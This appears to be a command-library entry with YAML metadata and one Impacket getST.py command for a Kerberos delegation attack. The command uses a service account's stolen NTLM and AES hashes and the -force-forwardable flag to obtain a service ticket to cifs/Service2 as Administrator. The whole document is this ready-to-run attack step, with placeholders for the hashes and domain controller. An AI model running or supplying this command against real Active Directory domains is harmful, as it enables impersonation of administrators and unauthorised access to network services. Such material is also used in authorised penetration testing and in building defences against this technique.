---
id: 83d2bbeb-1ddc-4b9b-a569-3ef5798a1bc7
name: getST.py command with force-forwardable flag
type: command
executor: bash
data: $ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes
  <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable -dc-ip
  <Domain controller>
output: null
created_at: '2023-04-06T03:56:07.951667+00:00'
updated_at: '2023-04-10T20:26:20.679788+00:00'
---

# getST.py command with force-forwardable flag

```bash
$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable -dc-ip <Domain controller>
```


